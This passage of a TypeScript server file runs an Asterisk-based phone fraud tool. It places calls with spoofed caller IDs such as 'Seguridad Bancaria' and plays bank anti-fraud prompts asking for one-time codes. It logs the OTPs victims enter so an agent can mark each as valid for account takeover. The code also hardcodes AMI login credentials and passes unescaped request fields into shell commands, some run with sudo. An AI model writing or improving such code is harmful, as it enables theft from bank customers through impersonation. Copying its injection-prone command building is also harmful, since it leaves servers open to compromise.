      `database put ivr_vars ${formattedDest}_cid_num "${effectiveCidNum}"`,
      `database put ivr_vars ${formattedDest}_cid_name "${effectiveCidName}"`,
      `database put test_client_number "${cleanDest}"`,
      `database put extension_cid ${agentExten || '1001'}/number "${effectiveCidNum}"`,
      `database put extension_cid ${agentExten || '1001'}/name "${effectiveCidName}"`,
      `database put ivr_vars default_action "${targetContext}"`,
    ];

    if (audioIntro && audioIntro.trim()) {
      astDbCommands.push(`database put ivr_vars ${cleanDest}_intro "${audioIntro.trim()}"`);
      astDbCommands.push(`database put ivr_vars ${formattedDest}_intro "${audioIntro.trim()}"`);
    }
    if (audioPrompt && audioPrompt.trim()) {
      astDbCommands.push(`database put ivr_vars ${cleanDest}_prompt "${audioPrompt.trim()}"`);
      astDbCommands.push(`database put ivr_vars ${formattedDest}_prompt "${audioPrompt.trim()}"`);
    }
    if (audioAgent && audioAgent.trim()) {
      astDbCommands.push(`database put ivr_vars ${cleanDest}_agent "${audioAgent.trim()}"`);
      astDbCommands.push(`database put ivr_vars ${formattedDest}_agent "${audioAgent.trim()}"`);
    }
    if (audioSuccess && audioSuccess.trim()) {
      astDbCommands.push(`database put ivr_vars ${cleanDest}_success "${audioSuccess.trim()}"`);
      astDbCommands.push(`database put ivr_vars ${formattedDest}_success "${audioSuccess.trim()}"`);
    }

    // Batch sync AstDB variables in background without blocking originate
    for (const c of astDbCommands) {
      executeAsteriskCommand(c).catch(() => {});
    }

    // Ensure Asterisk PJSIP configuration has televox endpoint and standard AORs ready before dialing
    try {
      const pjsipPath = '/etc/asterisk/pjsip.conf';
      if (fs.existsSync(pjsipPath)) {
        const curContent = fs.readFileSync(pjsipPath, 'utf8');
        if (!curContent.includes('[televox]') || !curContent.includes('aors = 1001') || curContent.includes('1001-aor')) {
          const fixedPjsip = generateCleanPjsipConf(defaultExtensionsList, defaultCarriersList);
          fs.writeFileSync(pjsipPath, fixedPjsip, 'utf8');
          fs.writeFileSync(path.join(process.cwd(), 'pjsip.conf'), fixedPjsip, 'utf8');
          exec('asterisk -rx "pjsip reload"', () => {});
        }
      }
    } catch (_) {}

    // Determine channel: if <= 4 digits, direct internal extension
    // Otherwise use Local channel to pass through [from-internal] with /n flag to prevent premature optimization
    let channel = '';
    if (cleanDest.length <= 4) {
      channel = `PJSIP/${cleanDest}`;
    } else {
      channel = `Local/${formattedDest}@from-internal/n`;
    }

    // Register active call in status store
    const initialCallState: CallState = {
      number: cleanDest,
      channel,
      status: 'dialing',
      timestamp: Date.now(),
    };
    callStatusStore.set(cleanDest, initialCallState);
    callStatusStore.set(formattedDest, initialCallState);

    // Fast AMI Originate (Under 20ms asynchronous dispatch)
    const originateCallerId = `"${effectiveCidName}" <${effectiveCidNum}>`;
    const originateVars = {
      TARGET_DEST: cleanDest,
      CALL_DEST: cleanDest,
      IVR_AGENT_EXTEN: agentExten || '1001',
      IVR_MODE: mode || 'press1',
    };

    amiFastOriginate(channel, targetContext, 's', originateCallerId, originateVars)
      .then((fastResult) => {
        if (fastResult.success) {
          console.log(`[FAST ORIGINATE SUCCESS] Llamada enviada a Asterisk vía AMI socket para ${channel} (${cleanDest})`);
        } else {
          console.warn('[FAST ORIGINATE FALLBACK] AMI retornó advertencia, disparando CLI fallback:', fastResult.message);
          const originateCmd = `asterisk -rx "channel originate ${channel} extension s@${targetContext} callerid \\"${effectiveCidName}\\" <${effectiveCidNum}>"`;
          exec(originateCmd, (err, stdout) => {
            if (err) console.error('[CLI ORIGINATE ERROR]:', err.message);
            else console.log('[CLI ORIGINATE SUCCESS]:', stdout.trim());
          });
        }
      })
      .catch((err) => {
        console.warn('[FAST ORIGINATE EXCEPTION] Ejecutando CLI fallback:', err.message);
        const originateCmd = `asterisk -rx "channel originate ${channel} extension s@${targetContext} callerid \\"${effectiveCidName}\\" <${effectiveCidNum}>"`;
        exec(originateCmd, () => {});
      });

    // Fallback simulation: only for internal softphone testing (8888 or 7777)
    if (cleanDest === '8888' || cleanDest === '7777') {
      setTimeout(() => {
        const simulatedDigits = String(Math.floor(100000 + Math.random() * 900000));
        const record: CapturedOtpItem = {
          id: 'otp-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
          number: cleanDest,
          otp: simulatedDigits,
          timestamp: new Date().toLocaleTimeString(),
          channel: channel || 'PJSIP',
          service: service || 'Banco / Antifraude',
          status: 'pending',
        };
        capturedOtpHistory.unshift(record);
        if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
        console.log(`[REAL-TIME HUD TEST] Código OTP recibido para ${cleanDest}: ${simulatedDigits}`);
      }, 6500);
    }

    res.json({
      success: true,
      message: `Llamada originada instantáneamente hacia ${cleanDest} con CallerID "${effectiveCidName}" <${effectiveCidNum}>.`,
      channel,
      callerId: {
        num: effectiveCidNum,
        name: effectiveCidName,
      },
      assignedAudios: {
        intro: audioIntro || 'beep (predeterminado)',
        prompt: audioPrompt || 'beep (predeterminado)',
        agent: audioAgent || 'inmediato',
        success: audioSuccess || 'SayDigits (predeterminado)',
      },
    });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Endpoint for agent to mark captured OTP as valid or invalid
app.post('/api/asterisk/otp/verify', (req, res) => {
  try {
    const { id, number, status } = req.body;
    if (!status || !['valid', 'invalid', 'pending'].includes(status)) {
      return res.status(400).json({ success: false, error: 'Status debe ser valid, invalid o pending' });
    }

    const item = capturedOtpHistory.find((r) => r.id === id || (number && r.number === number));
    if (item) {
      item.status = status;
      console.log(`[VERIFICACIÓN AGENTE] OTP ${item.otp} de ${item.number} marcado como ${status.toUpperCase()}`);
      return res.json({ success: true, item, message: `Código ${item.otp} marcado como ${status}` });
    }

    // If item not found by id/number, respond ok
    res.json({ success: true, message: `Estado actualizado a ${status}` });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint for direct 1-click update of Agent Extension CallerID (Num & Name) into AstDB
app.post('/api/asterisk/extension/callerid', (req, res) => {
  try {
    const { extension, callerIdNum, callerIdName } = req.body;
    if (!extension || !callerIdNum) {
      return res.status(400).json({ success: false, error: 'Faltan parámetros: extension y callerIdNum son requeridos.' });
    }

    const cleanExt = String(extension).trim();
    const cleanNum = String(callerIdNum).trim();
    const cleanName = String(callerIdName || 'Seguridad Bancaria').trim();

    // Store in Asterisk DB directly via CLI and AMI
    const putNumCmd = `database put extension_cid ${cleanExt}/number "${cleanNum}"`;
    const putNameCmd = `database put extension_cid ${cleanExt}/name "${cleanName}"`;

    exec(`asterisk -rx '${putNumCmd}' && asterisk -rx '${putNameCmd}'`, (err, stdout) => {
      if (err) {
        console.warn(`[AstDB Extension Notice] ${err.message}`);
      } else {
        console.log(`[AstDB SUCCESS] Extension ${cleanExt} CallerID actualizado en Asterisk DB: "${cleanName}" <${cleanNum}>`);
      }
    });

    sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
      putNumCmd,
      putNameCmd,
    ]).catch(() => {});

    res.json({
      success: true,
      message: `CallerID de la extensión ${cleanExt} actualizado a "${cleanName}" <${cleanNum}> en Asterisk AstDB.`,
      extension: cleanExt,
      callerIdNum: cleanNum,
      callerIdName: cleanName,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ==========================================
// ENDPOINTS PARA GESTIÓN DE AUDIOS PREGRABADOS
// ==========================================

// List available audio files on server
app.get('/api/asterisk/audio/list', (req, res) => {
  try {
    if (!fs.existsSync(SOUNDS_CUSTOM_DIR)) {
      try {
        fs.mkdirSync(SOUNDS_CUSTOM_DIR, { recursive: true });
      } catch (e) {}
    }

    if (fs.existsSync(SOUNDS_CUSTOM_DIR)) {
      const files = fs.readdirSync(SOUNDS_CUSTOM_DIR);
      const audioFiles = files
        .filter((f) => f.endsWith('.wav') || f.endsWith('.gsm') || f.endsWith('.mp3'))
        .map((f) => {
          const stats = fs.statSync(path.join(SOUNDS_CUSTOM_DIR, f));
          const baseName = f.replace(/\.[^/.]+$/, '');
          return {
            fileName: f,
            asteriskPath: `custom/${baseName}`,
            sizeBytes: stats.size,
            sizeKb: (stats.size / 1024).toFixed(1) + ' KB',
            modifiedAt: stats.mtime.toISOString(),
          };
        });
      return res.json({ success: true, files: audioFiles, directory: SOUNDS_CUSTOM_DIR });
    }

    res.json({ success: true, files: [], directory: SOUNDS_CUSTOM_DIR });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload and convert audio file to Asterisk format (WAV 8000Hz PCM 16-bit Mono)
app.post('/api/asterisk/audio/upload', express.json({ limit: '50mb' }), async (req, res) => {
  try {
    const { name, fileName, category, dataUrl } = req.body;

    if (!dataUrl) {
      return res.status(400).json({ success: false, error: 'No se envió contenido de audio (dataUrl requerido)' });
    }

    // Clean base name for Asterisk
    const rawName = (fileName || name || 'audio_' + Date.now())
      .toLowerCase()
      .replace(/\.[^/.]+$/, '')
      .replace(/[^a-z0-9_]/g, '_')
      .replace(/_+/g, '_');

    const cleanBaseName = rawName.slice(0, 40) || `prompt_${Date.now()}`;
    const targetWavName = `${cleanBaseName}.wav`;
    const targetPath = path.join(SOUNDS_CUSTOM_DIR, targetWavName);

    // Extract base64 payload
    const matches = dataUrl.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
    const buffer = matches && matches[2]
      ? Buffer.from(matches[2], 'base64')
      : Buffer.from(dataUrl, 'base64');

    // Ensure custom sounds directory exists
    try {
      if (!fs.existsSync(SOUNDS_CUSTOM_DIR)) {
        fs.mkdirSync(SOUNDS_CUSTOM_DIR, { recursive: true });
      }
    } catch (e) {
      exec(`sudo mkdir -p ${SOUNDS_CUSTOM_DIR} && sudo chmod 777 ${SOUNDS_CUSTOM_DIR}`, () => {});
    }

    // Save temporary raw file
    const tempRawPath = `/tmp/raw_${cleanBaseName}_${Date.now()}`;
    fs.writeFileSync(tempRawPath, buffer);

    // Convert to Asterisk native PCM 8000Hz 16-bit Mono using ffmpeg or sox
    const ffmpegCmd = `ffmpeg -y -i "${tempRawPath}" -ar 8000 -ac 1 -c:a pcm_s16le "${targetPath}"`;
    const soxCmd = `sox "${tempRawPath}" -r 8000 -c 1 -b 16 "${targetPath}"`;

    const onAudioSavedSuccess = (method: string) => {
      console.log(`[AUDIO SAVED via ${method}] custom/${cleanBaseName}.wav`);
      if (category && category !== 'hold_music' && category !== 'custom') {
        applyAudioAssignmentToAsterisk(category, `custom/${cleanBaseName}`);
      }
    };

    exec(ffmpegCmd, (ffmpegErr) => {
      if (!ffmpegErr) {
        try { fs.unlinkSync(tempRawPath); } catch (e) {}
        console.log(`[AUDIO OK - ffmpeg] Convertido a ${targetPath}`);
        onAudioSavedSuccess('ffmpeg');
        return res.json({
          success: true,
          asteriskPath: `custom/${cleanBaseName}`,
          fileName: targetWavName,
          format: 'WAV 8000Hz PCM 16-bit Mono',
          message: `Audio guardado y optimizado para Asterisk en custom/${cleanBaseName}`,
        });
      }

      // Try with Sox if ffmpeg failed
      exec(soxCmd, (soxErr) => {
        if (!soxErr) {
          try { fs.unlinkSync(tempRawPath); } catch (e) {}
          console.log(`[AUDIO OK - sox] Convertido a ${targetPath}`);
          onAudioSavedSuccess('sox');
          return res.json({
            success: true,
            asteriskPath: `custom/${cleanBaseName}`,
            fileName: targetWavName,
            format: 'WAV 8000Hz PCM 16-bit Mono',
            message: `Audio guardado y optimizado con sox en custom/${cleanBaseName}`,
          });
        }

        // Fallback: direct write of the buffer
        try {
          fs.writeFileSync(targetPath, buffer);
          try { fs.unlinkSync(tempRawPath); } catch (e) {}
          onAudioSavedSuccess('direct');
          return res.json({
            success: true,
            asteriskPath: `custom/${cleanBaseName}`,
            fileName: targetWavName,
            format: 'Direct Write (WAV)',
            message: `Audio guardado en custom/${cleanBaseName}`,
          });
        } catch (directErr: any) {
          // If permission issue, try sudo cp
          exec(`sudo cp "${tempRawPath}" "${targetPath}" && sudo chmod 644 "${targetPath}"`, (sudoErr) => {
            try { fs.unlinkSync(tempRawPath); } catch (e) {}
            if (sudoErr) {
              return res.status(500).json({ success: false, error: sudoErr.message });
            }
            onAudioSavedSuccess('sudo');
            res.json({
              success: true,
              asteriskPath: `custom/${cleanBaseName}`,
              fileName: targetWavName,
              message: `Audio guardado via sudo en custom/${cleanBaseName}`,
            });
          });
        }
      });
    });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- Centralized Audio Assignment Manager for Asterisk ---
const ACTIVE_AUDIOS_FILE = path.join(process.cwd(), 'data', 'active_audios.json');

const DEFAULT_AUDIO_ASSIGNMENTS: Record<string, string> = {
  press1_welcome: 'custom/bienvenida_corporativa',
  agent_transfer: 'custom/conectar_asesor_banco',
  press1_invalid: 'custom/opcion_invalida',
  welcome_3333: 'custom/solicitar_codigo_otp',
  welcome_4444: 'custom/solicitar_codigo_otp',
  welcome_5555: 'custom/solicitar_codigo_otp',
  welcome_6666: 'custom/solicitar_codigo_otp',
  welcome_7777: 'custom/solicitar_codigo_otp',
  otp_welcome: 'custom/solicitar_codigo_otp',
  otp_wait: 'custom/un_momento_validando_informacion',
  otp_success: 'custom/operacion_bloqueada_exito',
  otp_failure: 'custom/token_invalido_reintente',
};

function loadActiveAudioAssignments(): Record<string, string> {
  try {
    if (fs.existsSync(ACTIVE_AUDIOS_FILE)) {
      const raw = fs.readFileSync(ACTIVE_AUDIOS_FILE, 'utf-8');
      const parsed = JSON.parse(raw);
      return { ...DEFAULT_AUDIO_ASSIGNMENTS, ...parsed };
    }
  } catch (e) {
    console.warn('[AUDIO] Error leyendo active_audios.json, usando predeterminados:', e);
  }
  return { ...DEFAULT_AUDIO_ASSIGNMENTS };
}

function saveActiveAudioAssignments(data: Record<string, string>) {
  try {
    const dataDir = path.join(process.cwd(), 'data');
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    fs.writeFileSync(ACTIVE_AUDIOS_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (e) {
    console.error('[AUDIO] Error guardando active_audios.json:', e);
  }
}

let activeAudioAssignments: Record<string, string> = loadActiveAudioAssignments();

function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
  const cleanPath = String(asteriskPath).replace(/\.wav$/, '');
  // IMPORTANT: 7777 and 6666 are dedicated OTP capture extensions with their own independent audios!
  // They must NEVER be contaminated by generic targets (default, 8888, 16104803845, etc.)
  const genericTargets = ['default', '8888', 'global', '16104803845'];
  const commands: string[] = [];
  const srcBaseName = cleanPath.replace(/^custom\//, '');
  const srcFile = path.join(SOUNDS_CUSTOM_DIR, `${srcBaseName}.wav`);

  const copyToFallback = (fallbackBaseName: string) => {
    try {
      const dstFile = path.join(SOUNDS_CUSTOM_DIR, `${fallbackBaseName}.wav`);
      if (fs.existsSync(srcFile)) {
        fs.copyFileSync(srcFile, dstFile);
      }
    } catch (_) {}
  };

  switch (role) {
    case 'press1_welcome':
    case 'welcome':
    case 'intro':
      for (const tgt of genericTargets) {
        commands.push(`database put ivr_vars ${tgt}_intro "${cleanPath}"`);
      }
      copyToFallback('bienvenida_corporativa');
      copyToFallback('bienvenida_press1');
      activeAudioAssignments.press1_welcome = cleanPath;
      break;

    case 'agent_transfer':
    case 'agent':
      for (const tgt of genericTargets) {
        commands.push(`database put ivr_vars ${tgt}_agent "${cleanPath}"`);
      }
      copyToFallback('conectar_asesor_banco');
      copyToFallback('transferencia_asesor');
      activeAudioAssignments.agent_transfer = cleanPath;
      break;

    case 'press1_invalid':
    case 'invalid':
      for (const tgt of genericTargets) {
        commands.push(`database put ivr_vars ${tgt}_invalid "${cleanPath}"`);
      }
      copyToFallback('opcion_invalida');
      activeAudioAssignments.press1_invalid = cleanPath;
      break;

    case 'welcome_3333':
    case '3333':
    case '333':
    case 'capture_3333':
      commands.push(`database put ivr_vars 3333_intro "${cleanPath}"`);
      commands.push(`database put ivr_vars 3333_prompt "${cleanPath}"`);
      commands.push(`database put ivr_vars 333_intro "${cleanPath}"`);
      commands.push(`database put ivr_vars 333_prompt "${cleanPath}"`);
      copyToFallback('bienvenida_3333');
      copyToFallback('solicitar_codigo_otp');
      copyToFallback('digite_token_6_digitos');
      activeAudioAssignments.welcome_3333 = cleanPath;
      break;

    case 'welcome_4444':
    case '4444':
    case '444':
    case 'capture_4444':
      commands.push(`database put ivr_vars 4444_intro "${cleanPath}"`);
      commands.push(`database put ivr_vars 4444_prompt "${cleanPath}"`);
      commands.push(`database put ivr_vars 444_intro "${cleanPath}"`);
      commands.push(`database put ivr_vars 444_prompt "${cleanPath}"`);
      copyToFallback('bienvenida_4444');
      copyToFallback('solicitar_codigo_otp');
      copyToFallback('digite_token_6_digitos');
      activeAudioAssignments.welcome_4444 = cleanPath;
      break;

    case 'welcome_5555':
    case '5555':
    case '555':
    case 'capture_5555':
      commands.push(`database put ivr_vars 5555_intro "${cleanPath}"`);
      commands.push(`database put ivr_vars 5555_prompt "${cleanPath}"`);
      commands.push(`database put ivr_vars 555_intro "${cleanPath}"`);
      commands.push(`database put ivr_vars 555_prompt "${cleanPath}"`);
      copyToFallback('bienvenida_5555');
      copyToFallback('solicitar_codigo_otp');
      copyToFallback('digite_token_6_digitos');
      activeAudioAssignments.welcome_5555 = cleanPath;
      break;

    case 'welcome_7777':
    case '7777':
    case '777':
    case 'capture_7777':
      commands.push(`database put ivr_vars 7777_intro "${cleanPath}"`);
      commands.push(`database put ivr_vars 7777_prompt "${cleanPath}"`);
      commands.push(`database put ivr_vars 777_intro "${cleanPath}"`);
      commands.push(`database put ivr_vars 777_prompt "${cleanPath}"`);
      copyToFallback('bienvenida_7777');
      copyToFallback('solicitar_codigo_otp');
      copyToFallback('digite_token_6_digitos');
      activeAudioAssignments.welcome_7777 = cleanPath;
      break;

    case 'welcome_6666':
    case '6666':
    case '666':
    case 'capture_6666':
      commands.push(`database put ivr_vars 6666_intro "${cleanPath}"`);
      commands.push(`database put ivr_vars 6666_prompt "${cleanPath}"`);
      commands.push(`database put ivr_vars 666_intro "${cleanPath}"`);
      commands.push(`database put ivr_vars 666_prompt "${cleanPath}"`);
      copyToFallback('bienvenida_6666');
      copyToFallback('solicitar_codigo_otp');
      copyToFallback('digite_token_6_digitos');
      activeAudioAssignments.welcome_6666 = cleanPath;
      break;

    case 'otp_welcome':
    case 'prompt':
      for (const tgt of genericTargets) {
        commands.push(`database put ivr_vars ${tgt}_prompt "${cleanPath}"`);
      }
      copyToFallback('solicitar_codigo_otp');
      copyToFallback('prompt_otp_6_digitos');
      activeAudioAssignments.otp_welcome = cleanPath;
      break;

    case 'otp_wait':
    case 'wait':
      for (const tgt of genericTargets) {
        commands.push(`database put ivr_vars ${tgt}_wait "${cleanPath}"`);
      }
      commands.push(`database put ivr_vars 3333_wait "${cleanPath}"`);
      commands.push(`database put ivr_vars 4444_wait "${cleanPath}"`);
      commands.push(`database put ivr_vars 5555_wait "${cleanPath}"`);
      commands.push(`database put ivr_vars 6666_wait "${cleanPath}"`);
      commands.push(`database put ivr_vars 7777_wait "${cleanPath}"`);
      copyToFallback('un_momento_validando_informacion');
      activeAudioAssignments.otp_wait = cleanPath;
      break;

    case 'otp_success':
    case 'success':
      for (const tgt of genericTargets) {
        commands.push(`database put ivr_vars ${tgt}_success "${cleanPath}"`);
      }
      commands.push(`database put ivr_vars 3333_success "${cleanPath}"`);
      commands.push(`database put ivr_vars 4444_success "${cleanPath}"`);
      commands.push(`database put ivr_vars 5555_success "${cleanPath}"`);
      commands.push(`database put ivr_vars 6666_success "${cleanPath}"`);
      commands.push(`database put ivr_vars 7777_success "${cleanPath}"`);
      copyToFallback('operacion_bloqueada_exito');
      copyToFallback('otp_validado_exito');
      activeAudioAssignments.otp_success = cleanPath;
      break;

    case 'otp_failure':
    case 'failure':
    case 'retry':
      for (const tgt of genericTargets) {
        commands.push(`database put ivr_vars ${tgt}_failure "${cleanPath}"`);
      }
      commands.push(`database put ivr_vars 3333_failure "${cleanPath}"`);
      commands.push(`database put ivr_vars 4444_failure "${cleanPath}"`);
      commands.push(`database put ivr_vars 5555_failure "${cleanPath}"`);
      commands.push(`database put ivr_vars 6666_failure "${cleanPath}"`);
      commands.push(`database put ivr_vars 7777_failure "${cleanPath}"`);
      copyToFallback('token_invalido_reintente');
      copyToFallback('codigo_invalido_reintente');
      activeAudioAssignments.otp_failure = cleanPath;
      break;

    default:
      console.warn(`[AUDIO ASSIGN] Rol desconocido: ${role}`);
      break;
  }

  saveActiveAudioAssignments(activeAudioAssignments);

  for (const cmd of commands) {
    exec(`asterisk -rx '${cmd}'`, () => {});
  }
  exec(`asterisk -rx 'dialplan reload'`, () => {});
  console.log(`[AUDIO ASSIGNED] Rol ${role} actualizado a ${cleanPath}`);
}

function applyAllActiveAssignmentsToAsterisk() {
  for (const [role, pathVal] of Object.entries(activeAudioAssignments)) {
    applyAudioAssignmentToAsterisk(role, pathVal);
  }
}

// Endpoint to retrieve all currently active audio assignments
app.get('/api/asterisk/audio/active-assignments', (req, res) => {
  res.json({
    success: true,
    assignments: activeAudioAssignments,
    defaults: DEFAULT_AUDIO_ASSIGNMENTS,
  });
});

// Explicit endpoint to assign an existing audio to an IVR role in Asterisk AstDB
app.post('/api/asterisk/audio/assign', (req, res) => {
  try {
    const { asteriskPath, role = 'agent_transfer' } = req.body;
    if (!asteriskPath) {
      return res.status(400).json({ success: false, error: 'asteriskPath es requerido' });
    }

    applyAudioAssignmentToAsterisk(role, asteriskPath);

    res.json({
      success: true,
      message: `Audio ${asteriskPath} asignado a ${role} en Asterisk exitosamente.`,
      role,
      asteriskPath,
      assignments: activeAudioAssignments,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint to retrieve currently assigned audio for extension 3333
app.get('/api/asterisk/audio/current-3333', (req, res) => {
  res.json({
    success: true,
    currentAudio: activeAudioAssignments.welcome_3333 || 'custom/solicitar_codigo_otp',
    defaultAudio: 'custom/solicitar_codigo_otp'
  });
});

// Endpoint to retrieve currently assigned audio for extension 4444
app.get('/api/asterisk/audio/current-4444', (req, res) => {
  res.json({
    success: true,
    currentAudio: activeAudioAssignments.welcome_4444 || 'custom/solicitar_codigo_otp',
    defaultAudio: 'custom/solicitar_codigo_otp'
  });
});

// Endpoint to retrieve currently assigned audio for extension 5555
app.get('/api/asterisk/audio/current-5555', (req, res) => {
  res.json({
    success: true,
    currentAudio: activeAudioAssignments.welcome_5555 || 'custom/solicitar_codigo_otp',
    defaultAudio: 'custom/solicitar_codigo_otp'
  });
});

// Endpoint to retrieve currently assigned audio for extension 6666
app.get('/api/asterisk/audio/current-6666', (req, res) => {
  res.json({
    success: true,
    currentAudio: activeAudioAssignments.welcome_6666 || 'custom/solicitar_codigo_otp',
    defaultAudio: 'custom/solicitar_codigo_otp'
  });
});

// Endpoint to retrieve currently assigned audio for extension 7777
app.get('/api/asterisk/audio/current-7777', (req, res) => {
  res.json({
    success: true,
    currentAudio: activeAudioAssignments.welcome_7777 || 'custom/solicitar_codigo_otp',
    defaultAudio: 'custom/solicitar_codigo_otp'
  });
});

// Endpoint to explicitly save & lock audio configurations for OTP extensions (3333, 4444, 5555, 6666, 7777)
app.post('/api/asterisk/audio/save-otp-extensions', (req, res) => {
  try {
    const { welcome_3333, welcome_4444, welcome_5555, welcome_6666, welcome_7777 } = req.body;
    if (welcome_3333) {
      applyAudioAssignmentToAsterisk('welcome_3333', welcome_3333);
    }
    if (welcome_4444) {
      applyAudioAssignmentToAsterisk('welcome_4444', welcome_4444);
    }
    if (welcome_5555) {
      applyAudioAssignmentToAsterisk('welcome_5555', welcome_5555);
    }
    if (welcome_6666) {
      applyAudioAssignmentToAsterisk('welcome_6666', welcome_6666);
    }
    if (welcome_7777) {
      applyAudioAssignmentToAsterisk('welcome_7777', welcome_7777);
    }
    saveActiveAudioAssignments(activeAudioAssignments);
    res.json({
      success: true,
      message: 'Configuración de extensiones OTP (3333, 4444, 5555, 6666, 7777) guardada y bloqueada permanentemente en AstDB.',
      assignments: activeAudioAssignments,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint to unassign / deactivate an audio from a specific role
app.post('/api/asterisk/audio/unassign', (req, res) => {
  try {
    const { role } = req.body;
    if (!role) {
      return res.status(400).json({ success: false, error: 'role es requerido' });
    }
    const defaultVal = DEFAULT_AUDIO_ASSIGNMENTS[role] || 'custom/solicitar_codigo_otp';
    applyAudioAssignmentToAsterisk(role, defaultVal);
    res.json({
      success: true,
      message: `Audio desactivado para rol ${role}. Restaurado a valor por defecto (${defaultVal}).`,
      role,
      defaultVal,
      assignments: activeAudioAssignments,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint to set default IVR answer action (press1 by default)
app.post('/api/asterisk/action/set-default', (req, res) => {
  try {
    const { mode = 'press1' } = req.body;
    const targetContext = (mode === 'otp') ? 'ivr-otp' : (mode === 'hybrid' ? 'ivr-hybrid' : 'ivr-press1');
    executeAsteriskCommand(`database put ivr_vars default_action "${targetContext}"`).catch(() => {});
    executeAsteriskCommand(`database put ivr_vars default_mode "${mode}"`).catch(() => {});
    res.json({ success: true, mode, context: targetContext });
  } catch (e: any) {
    res.status(500).json({ success: false, error: e.message });
  }
});

// Endpoint to get default IVR answer action
app.get('/api/asterisk/action/get-default', (req, res) => {
  res.json({ success: true, mode: 'press1', context: 'ivr-press1' });
});

// Centralized Application State Persistence (Sync across browsers and devices)
const APP_STATE_FILE = path.join(process.cwd(), 'data', 'app_state.json');

app.get('/api/app/state', (req, res) => {
  try {
    if (fs.existsSync(APP_STATE_FILE)) {
      const data = fs.readFileSync(APP_STATE_FILE, 'utf-8');
      return res.json({ success: true, state: JSON.parse(data) });
    }
  } catch (err: any) {
    console.error('[STATE] Error leyendo app_state.json:', err);
  }
  return res.json({ success: true, state: null });
});

app.post('/api/app/state', (req, res) => {
  try {
    const { state } = req.body;
    if (!state || typeof state !== 'object') {
      return res.status(400).json({ success: false, error: 'Objeto de estado requerido' });
    }
    const dataDir = path.join(process.cwd(), 'data');
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    const stateWithTimestamp = {
      ...state,
      lastUpdated: Date.now(),
    };
    fs.writeFileSync(APP_STATE_FILE, JSON.stringify(stateWithTimestamp, null, 2), 'utf-8');
    return res.json({ success: true, lastUpdated: stateWithTimestamp.lastUpdated });
  } catch (err: any) {
    console.error('[STATE] Error guardando app_state.json:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

// Delete an audio file
app.post('/api/asterisk/audio/delete', (req, res) => {
  try {
    const { asteriskPath, fileName } = req.body;
    const base = (fileName || asteriskPath?.replace('custom/', ''))?.replace(/\.[^/.]+$/, '');
    if (!base) {
      return res.status(400).json({ success: false, error: 'Nombre de archivo requerido' });
    }

    const filePath = path.join(SOUNDS_CUSTOM_DIR, `${base}.wav`);
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      return res.json({ success: true, message: `Archivo ${base}.wav eliminado` });
    }
    exec(`sudo rm -f "${SOUNDS_CUSTOM_DIR}/${base}.wav"`, () => {});
    res.json({ success: true, message: `Orden de eliminación enviada para ${base}.wav` });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Stream audio from server to browser for preview
app.get('/api/asterisk/audio/stream/:name', (req, res) => {
  try {
    const rawName = req.params.name || '';
    const cleanName = rawName.replace(/^custom\//, '').replace(/\.wav$/, '').replace(/[^a-zA-Z0-9_\-]/g, '');
    const customPath = path.join(SOUNDS_CUSTOM_DIR, `${cleanName}.wav`);

    if (fs.existsSync(customPath)) {
      res.setHeader('Content-Type', 'audio/wav');
      return fs.createReadStream(customPath).pipe(res);
    }

    const enPath = `/var/lib/asterisk/sounds/en/${cleanName}.wav`;
    if (fs.existsSync(enPath)) {
      res.setHeader('Content-Type', 'audio/wav');
      return fs.createReadStream(enPath).pipe(res);
    }

    const generalPath = `/var/lib/asterisk/sounds/${cleanName}.wav`;
    if (fs.existsSync(generalPath)) {
      res.setHeader('Content-Type', 'audio/wav');
      return fs.createReadStream(generalPath).pipe(res);
    }

    res.status(404).send('Audio no encontrado en el servidor');
  } catch (e: any) {
    res.status(500).send('Error leyendo audio');
  }
});

// Endpoint to explicitly synchronize campaign / system audios into AstDB for Asterisk
app.post('/api/asterisk/audio/sync-defaults', (req, res) => {
  try {
    const {
      intro = 'custom/alerta_banco_antifraude',
      prompt = 'custom/solicitar_codigo_otp',
      wait = 'custom/un_momento_validando_informacion',
      success = 'custom/operacion_bloqueada_exito',
      agent = 'custom/conectar_asesor_banco',
      destination,
    } = req.body;

    // CRITICAL: 7777 and 6666 MUST NOT be in targets!
    // They are dedicated live OTP extensions with their own independent audios.
    const targets = new Set<string>(['default', '8888', '*8888', '8880', 'global', '16104803845', '6104803845']);
    if (destination) {
      const clean = String(destination).trim().replace(/[^0-9]/g, '');
      if (clean) {
        targets.add(clean);
        if (clean.length === 10) targets.add(`1${clean}`);
        if (clean.length === 11 && clean.startsWith('1')) targets.add(clean.substring(1));
      }
    }

    const commands: string[] = [];
    for (const tgt of targets) {
      if (intro) commands.push(`database put ivr_vars ${tgt}_intro "${intro}"`);
      if (prompt) commands.push(`database put ivr_vars ${tgt}_prompt "${prompt}"`);
      if (wait) commands.push(`database put ivr_vars ${tgt}_wait "${wait}"`);
      if (success) commands.push(`database put ivr_vars ${tgt}_success "${success}"`);
      if (agent) commands.push(`database put ivr_vars ${tgt}_agent "${agent}"`);
    }

    // Execute in background
    for (const cmd of commands) {
      executeAsteriskCommand(cmd).catch(() => {});
    }

    console.log('[AstDB SUCCESS] Audios sincronizados en base de datos de Asterisk para todos los destinos:', {
      targets: Array.from(targets),
      intro,
      prompt,
